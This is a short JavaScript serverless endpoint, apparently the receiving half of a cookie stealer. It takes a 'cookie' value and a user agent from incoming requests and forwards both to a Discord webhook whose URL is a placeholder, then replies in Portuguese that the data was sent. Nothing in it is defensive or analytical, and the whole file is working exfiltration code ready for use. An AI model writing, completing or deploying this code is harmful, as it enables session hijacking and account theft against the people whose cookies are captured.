export default async function handler(req, res) {
  const { cookie, ua } = req.body || {}
  const webhook = "https://discord.com/api/webhooks/SEU_WEBHOOK_AQUI"

  await fetch(webhook, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      content: `🍪 Cookie: \`${cookie || 'nada'}\`\n📱 UA: \`${ua || 'nulo'}\``
    })
  })

  res.status(200).json({ status: "Enviado pro DK" })
}
